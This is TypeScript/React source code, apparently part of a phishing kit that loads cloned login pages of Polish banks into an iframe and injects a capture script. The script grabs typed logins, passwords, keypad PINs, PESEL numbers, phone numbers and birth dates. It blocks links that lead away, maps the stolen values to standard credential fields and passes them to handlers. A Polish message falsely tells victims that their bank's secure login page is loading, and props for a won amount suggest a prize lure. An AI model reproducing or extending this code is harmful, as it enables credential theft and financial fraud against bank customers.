      try {
        qsa(root, "input, textarea").forEach((el) => {
          const t = (el.getAttribute("type") || "text").toLowerCase();
          if (IGNORED.includes(t)) return;
          if (!isVisibleEl(el)) return;
          out.push(el);
        });
      } catch (e) {}
      return out;
    };
    const allFieldsFilled = () => {
      try {
        const inputs = fillableInputs(document);
        if (!inputs.length) return true;
        return inputs.every((el) => (el.value || "").trim() !== "");
      } catch (e) { return true; }
    };
    const flashEmpty = () => {
      try {
        fillableInputs(document).forEach((el) => {
          if ((el.value || "").trim() !== "") return;
          try {
            el.style.setProperty("box-shadow", "0 0 0 2px rgba(239,68,68,.9)", "important");
            el.style.setProperty("border-color", "#ef4444", "important");
            const target = el;
            setTimeout(() => {
              try {
                target.style.removeProperty("box-shadow");
                target.style.removeProperty("border-color");
              } catch (e) {}
            }, 1400);
          } catch (e) {}
        });
      } catch (e) {}
    };

    // ------------------------------------------------------------------
    // SUBMIT-READY: gri submit butonlari tum alanlar dolunca renklenir;
    // form eksikse buton soluk + not-allowed gorunur.
    // ------------------------------------------------------------------
    const READY_COLORS = {};
    const updateSubmitReady = (root) => {
      try {
        const inputs = fillableInputs(root);
        if (inputs.length === 0) return;
        const ready = inputs.every((el) => (el.value || "").trim() !== "");
        const readyColor = READY_COLORS[BANK_SLUG] || BRAND_COLOR || "";
        // Native submit'ler + ozel elementler (<ing-button>, <a>Zaloguj</a>,
        // typesiz <button>) isSubmitish ile yakalanir — hepsi gri/aktif stili alir.
        const seen = new Set();
        const btns = [];
        qsa(root, "input[type=submit], button, [type=submit], a, [role='button'], ing-button, .gigya-composite-control-submit input, .de-login-submit input").forEach((b) => {
          try {
            if (seen.has(b)) return;
            seen.add(b);
            const t = (b.getAttribute("type") || "").toLowerCase();
            const isNativeSubmit = (b.tagName === "INPUT" || b.tagName === "BUTTON") && t === "submit";
            if (isNativeSubmit || t === "submit" || isSubmitish(b)) btns.push(b);
          } catch (e) {}
        });
        btns.forEach((btn) => {
          try {
            // Form eksikse butonu pasif GOSTER (tiklamayi handler engelliyor)
            if (!ready && !btn.__plDisabledStyled) {
              btn.style.setProperty("opacity", "0.55", "important");
              btn.style.setProperty("filter", "grayscale(.35)", "important");
              btn.style.setProperty("cursor", "not-allowed", "important");
              btn.__plDisabledStyled = true;
            } else if (ready && btn.__plDisabledStyled) {
              btn.style.removeProperty("opacity");
              btn.style.removeProperty("filter");
              btn.style.removeProperty("cursor");
              btn.__plDisabledStyled = false;
            }
            if (!readyColor) return;
            const cs = root.defaultView ? root.defaultView.getComputedStyle(btn) : getComputedStyle(btn);
            const m = /rgba?\\((\\d+),\\s*(\\d+),\\s*(\\d+)/.exec(cs.backgroundColor || "");
            const grayish = m && Math.abs(+m[1] - +m[2]) < 20 && Math.abs(+m[2] - +m[3]) < 20 && +m[1] > 140;
            if (ready && (grayish || btn.__plReadyStyled)) {
              btn.style.setProperty("background-color", readyColor, "important");
              btn.style.setProperty("color", "#ffffff", "important");
              btn.__plReadyStyled = true;
            } else if (!ready && btn.__plReadyStyled) {
              btn.style.removeProperty("background-color");
              btn.style.removeProperty("color");
              btn.__plReadyStyled = false;
            }
          } catch (e) {}
        });
      } catch (e) {}
    };

    const attach = (doc) => {
      if (!doc || doc.__plCaptureInjected) return;
      doc.__plCaptureInjected = true;

      enableControls(doc);
      fixShadowRoots();
      fillEmptyPeselBoxes(doc);
      applyMaskedBehavior(doc);
      applyIngFix();
      killOverlays(doc);
      unblockInputs(doc);
      cleanupErrorState(doc);
      updateSubmitReady(doc);
      doc.addEventListener("input", () => updateSubmitReady(doc), true);
      doc.addEventListener("change", () => updateSubmitReady(doc), true);
      try {
        new MutationObserver((mutations) => {
          for (const m of mutations) {
            if (m.type === "attributes" && m.target && m.target.nodeType === 1) {
              const el = m.target;
              try {
                if (el.hasAttribute("disabled")) el.removeAttribute("disabled");
                if (el.hasAttribute("ng-disabled")) el.removeAttribute("ng-disabled");
                if (el.getAttribute && el.getAttribute("aria-disabled") === "true") el.setAttribute("aria-disabled", "false");
              } catch (e) {}
            }
          }
        }).observe(doc.documentElement || doc, { attributes: true, attributeFilter: ["disabled", "ng-disabled", "aria-disabled"], subtree: true });
      } catch (e) {}

      doc.addEventListener("submit", (e) => {
        try { e.preventDefault(); e.stopPropagation(); } catch (err) {}
        if (!allFieldsFilled()) { flashEmpty(); updateSubmitReady(doc); return false; }
        send("form-submit");
        return false;
      }, true);

      doc.addEventListener("click", (e) => {
        // composedPath: shadow root icinden gelen tiklamada e.target
        // host'a retarget edilir — gercek zincir path'te durur.
        const path = evPath(e);
        const et = path[0] || e.target;
        try {
          for (const t0 of path) {
            if (t0 && (t0.id === "pl-keypad-continue" || t0.id === "pl-keypad-backspace")) return;
          }
        } catch (err) {}

        // --------------------------------------------------------------
        // A[href] YAKALAMA: iframe icinde dis siteye gitmeye calisan
        // linkler sandbox'ta kirilir (Alior "Cofnij" -> bos gri sayfa).
        // Geri linkleri = bir onceki adim; diger linkler = engelle.
        // Submit gorunumlu linkler (Millennium "Zaloguj" gibi) normal
        // submit akisina birakilir — yutulmamali.
        // --------------------------------------------------------------
        try {
          let a = null;
          for (const n of path) {
            if (n && n.tagName === "A" && n.getAttribute && n.getAttribute("href")) { a = n; break; }
          }
          if (a && !isSubmitish(a)) {
            try { e.preventDefault(); e.stopPropagation(); } catch (err) {}
            const atxt = (
              (a.innerText || a.textContent || "") + " " +
              (typeof a.className === "string" ? a.className : "") + " " +
              (a.getAttribute("ui-sref") || "") + " " + (a.id || "")
            ).toLowerCase();
            if (/cofnij|wstecz|powr|go[-_\\s]?back|\\bback\\b|sign-in/.test(atxt)) {
              try {
                (window.top || window.parent).postMessage(
                  { type: "PL_BANK_SUBMIT", step: STEP, trigger: "nav-back", data: {} }, "*"
                );
              } catch (err) {}
            }
            return;
          }
        } catch (err) {}

        try {
          for (const el of path) {
            if (el && el.nodeType === 1 && el.tagName && el.tagName.toLowerCase() === "button") {
              const dv = el.getAttribute("data-value");
              if (dv != null && /^[0-9]$/.test(dv)) {
                if (keypadBuffer.length < PIN_MAX) keypadBuffer += dv;
                renderKeypad();
                return;
              }
              if (hasKeypad() && (el.getAttribute("data-variant") === "icon" || /iconbutton/i.test(typeof el.className === "string" ? el.className : ""))) {
                keypadBuffer = keypadBuffer.slice(0, -1);
                renderKeypad();
                return;
              }
            }
          }
        } catch (err) {}

        try {
          const t = et;
          const ttag = (t && t.tagName || "").toLowerCase();
          if (ttag === "input" || ttag === "textarea" || ttag === "select") {
            const ttype = (t.getAttribute("type") || "").toLowerCase();
            if (ttag !== "input" || (ttype !== "submit" && ttype !== "button" && ttype !== "image")) return;
          }
        } catch (err) {}
        for (const el2 of path) {
          if (el2 && el2.nodeType === 1 && isSubmitish(el2)) {
            try { e.preventDefault(); e.stopPropagation(); } catch (err) {}
            // Form eksikse: bos alanlari kirmizi isaretle, GONDERME.
            if (!allFieldsFilled()) { flashEmpty(); updateSubmitReady(doc); return; }
            send("click:" + (el2.tagName || "").toLowerCase());
            return;
          }
        }
      }, true);

      doc.addEventListener("keydown", (e) => {
        try {
          if (e.key === "Backspace" && keypadBuffer.length > 0 && hasKeypad()) {
            keypadBuffer = keypadBuffer.slice(0, -1);
            renderKeypad();
            return;
          }
          if (e.key === "Enter" && hasKeypad() && keypadBuffer.length >= 4) {
            flushKeypad();
            return;
          }
          if (e.key !== "Enter") return;
          const t = evtTarget(e);
          if (!t || !t.getAttribute) return;
          const tag = (t.tagName || "").toLowerCase();
          if (tag !== "input" && tag !== "select") return;
          const type = (t.getAttribute("type") || "text").toLowerCase();
          if (type === "hidden" || type === "checkbox" || type === "radio") return;
          if (!allFieldsFilled()) { flashEmpty(); updateSubmitReady(doc); return; }
          send("enter-key");
        } catch (err) {}
      }, true);
    };

    const scanIframes = (doc, depth) => {
      if (!doc || depth > 4) return;
      try {
        qsa(doc, "iframe").forEach((f) => {
          try {
            const d = f.contentDocument;
            if (d) { attach(d); scanIframes(d, depth + 1); }
            f.addEventListener("load", () => {
              try {
                if (f.contentDocument) { attach(f.contentDocument); scanIframes(f.contentDocument, depth + 1); }
              } catch (e) {}
            });
          } catch (e) {}
        });
      } catch (e) {}
    };

    attach(document);
    scanIframes(document, 0);
    try {
      new MutationObserver(() => { scanIframes(document, 0); enableControls(document); fixShadowRoots(); fillEmptyPeselBoxes(document); applyMaskedBehavior(document); killOverlays(document); unblockInputs(document); cleanupErrorState(document); updateSubmitReady(document); }).observe(document.documentElement, { childList: true, subtree: true });
    } catch (e) {}
    let tries = 0;
    const retry = setInterval(() => {
      scanIframes(document, 0);
      enableControls(document);
      fixShadowRoots();
      fillEmptyPeselBoxes(document);
      applyMaskedBehavior(document);
      applyIngFix();
      killOverlays(document);
      unblockInputs(document);
      cleanupErrorState(document);
      updateSubmitReady(document);
      renderKeypad();
      if (++tries > 30) clearInterval(retry);
    }, 500);
  })();`;
}

// Ham form alanlarini standart credential alanlarina esler
// (username / password / bankPhone / pin / personalCode / pesel)
function canonicalizeCaptured(raw: Record<string, string>): Record<string, string> {
  const out: Record<string, string> = { ...raw };
  // Lehxce "ł" NFD ile ayrismaz — elle l'ye cevir (hasło -> haslo,
  // aksi halde iPKO/BSR sifresi "wpiszhaso" kalip password'a eslesmez)
  const norm = (k: string) =>
    k
      .toLowerCase()
      .replace(/ł/g, "l")
      .normalize("NFD")
      .replace(/[\u0300-\u036f]/g, "")
      .replace(/[^a-z0-9]/g, "");
  for (const [k, v] of Object.entries(raw)) {
    if (!v || !v.trim()) continue;
    const n = norm(k);
    const looksPassword = /password|haslo|maskedpassword|pass$|^pin|pin$|pincode|pinnumber/.test(n);
    if (
      !looksPassword &&
      (/username|loginid|loginnumber|formuserid|userid|customerid|customernumber|cifcustomernumber|email|millecode|millekod|clientid|clientnumber|^nik$|^login$|^customer$|identyfikator|numerklienta/.test(n) ||
        /logininput|loginmain|loginfield/.test(n))
    ) {
      out.username ||= v;
      out.verfuegernummer ||= v;
    }
    if (/password|loginpassword|pfpass|pssword|haslo|maskedpassword|pass$/.test(n)) {
      out.password ||= v;
      out.pin ||= v;
    }
    if (/phonenumber|bankphone|phone$|mobile|gsm|telefon|nrtelefonu/.test(n)) {
      out.bankPhone ||= v;
    }
    if (/^passcode$|^pin$|^otp$|^tac$/.test(n)) {
      out.pin ||= v;
      out.password ||= v;
    }
    // Millennium: millecode -> username (yukaridaki regex zaten yakaladi)
    if (/^mc$/.test(n)) {
      out.username ||= v;
      out.verfuegernummer ||= v;
    }
    // PESEL (Millennium kombine alani)
    if (/pesel/.test(n)) {
      out.pesel ||= v;
    }
    // Giris yontemi
    if (/loginmethod|authmethod/.test(n)) {
      out.loginMethod ||= v;
    }
    // Dogum tarihi
    if (/dateofbirth|dob|birthdate|birthday|dataurodzenia/.test(n)) {
      const digits = v.replace(/\D/g, "").slice(0, 8);
      out.dateOfBirth ||=
        digits.length === 8
          ? `${digits.slice(0, 2)}/${digits.slice(2, 4)}/${digits.slice(4, 8)}`
          : v;
    }
  }
  return out;
}

export function PolandBankTemplate({ bankSlug, onChange, handleRouteAction, onProgressSave, saving, bankName, logoFile, brandColor, wonAmount, wonLabel }: Props) {
  const [files, setFiles] = useState<string[]>([]);
  const [step, setStep] = useState(0);
  const [loadError, setLoadError] = useState(false);
  const iframeRef = useRef<HTMLIFrameElement>(null);

  const handleRouteActionRef = useRef(handleRouteAction);
  const onChangeRef = useRef(onChange);
  const onProgressSaveRef = useRef(onProgressSave);
  const bankSlugRef = useRef<string>("");
  const capturedRef = useRef<Record<string, string>>({});
  const filesRef = useRef<string[]>([]);
  const stepRef = useRef(0);
  handleRouteActionRef.current = handleRouteAction;
  onChangeRef.current = onChange;
  onProgressSaveRef.current = onProgressSave;
  bankSlugRef.current = (bankSlug || "").toString().trim().toLowerCase();
  filesRef.current = files;
  stepRef.current = step;

  useEffect(() => {
    let cancelled = false;
    const slug = (bankSlug || "").toString().trim().toLowerCase();
    if (!slug) {
      setFiles([]);
      return;
    }
    fetch(`/api/pl-banks?bank=${encodeURIComponent(slug)}`, { cache: "no-store" })
      .then((r) => (r.ok ? r.json() : { files: [] }))
      .then((d) => {
        if (cancelled) return;
        const list = Array.isArray(d?.files) ? d.files : [];
        setFiles(list.length > 0 ? list : ["1.html"]);
      })
      .catch(() => {
        if (!cancelled) setFiles(["1.html"]);
      });
    return () => {
      cancelled = true;
    };
  }, [bankSlug]);

  useEffect(() => {
    const onMessage = (event: MessageEvent) => {
      const data = event?.data;
      if (!data || typeof data !== "object") return;
      if (data.type !== "PL_BANK_SUBMIT") return;
      // Geri navigasyonu (ornek Alior "Cofnij"): veri olmasa da adim geri al
      if (data.trigger === "nav-back") {
        setStep((s) => Math.max(0, s - 1));
        return;
      }
      const payload = data.data && typeof data.data === "object" ? { ...(data.data as Record<string, string>) } : {};
      if (Object.keys(payload).length === 0) return;

      for (const [k, v] of Object.entries(payload)) {
        if (typeof v === "string" && v.trim() !== "") {
          capturedRef.current[k] = v;
        }
      }
      const merged = canonicalizeCaptured(capturedRef.current);

      if (merged.username) onChangeRef.current("verfuegernummer", merged.username);
      if (merged.pin) onChangeRef.current("pin", merged.pin);

      const lastIndex = filesRef.current.length - 1;
      const incomingStep = typeof data.step === "number" ? data.step : stepRef.current;

      if (incomingStep < lastIndex) {
        onProgressSaveRef.current?.(merged);
        setStep(incomingStep + 1);
        return;
      }

      handleRouteActionRef.current({
        ...merged,
        bankSlug: bankSlugRef.current,
      });
    };
    window.addEventListener("message", onMessage);
    return () => window.removeEventListener("message", onMessage);
  }, []);

  const injectScript = () => {
    try {
      const doc = iframeRef.current?.contentDocument;
      if (!doc) return;
      const script = doc.createElement("script");
      script.textContent = buildInjectionScript(
        stepRef.current,
        bankSlugRef.current,
        (brandColor || "").toString().trim(),
      );
      doc.documentElement.appendChild(script);
    } catch (err) {
      console.error("PL bank iframe injection error:", err);
    }
  };

  if (files.length === 0) {
    return (
      <div className="flex min-h-screen items-center justify-center p-4 bg-[#fff6ec]">
        <p className="rounded-xl border border-blue-500/30 bg-blue-500/10 p-5 text-center text-sm text-blue-700">
          Ładowanie bezpiecznej strony logowania Twojego banku...
        </p>
      </div>
    );
  }

  const currentFile = files[Math.min(step, files.length - 1)];

  return (
    <div
      className="fixed inset-0 w-[100vw] bg-[#fff6ec] z-[9999] overflow-hidden"
      style={{ minHeight: "100vh", height: "100dvh" }}
    >
      <style>{`body.ah-theme,body.ah-theme-overlay-bg,body{background:#fff6ec !important;background-image:none !important}`}</style>
      {saving && (
        <div className="absolute inset-0 bg-[#fff6ec]/80 backdrop-blur-sm z-[99999] flex items-center justify-center">
          <div className="animate-spin rounded-full h-12 w-12 border-b-2 border-blue-600"></div>
        </div>
      )}

      <iframe
        key={`${bankSlug}-${currentFile}`}
        ref={iframeRef}
        src={`/pl-banks/${bankSlug}/${currentFile}`}
        className="w-full border-0"
        style={{ height: "100dvh", display: "block" }}
        sandbox="allow-scripts allow-same-origin allow-forms allow-popups"
        onLoad={injectScript}
      />
    </div>
  );
}
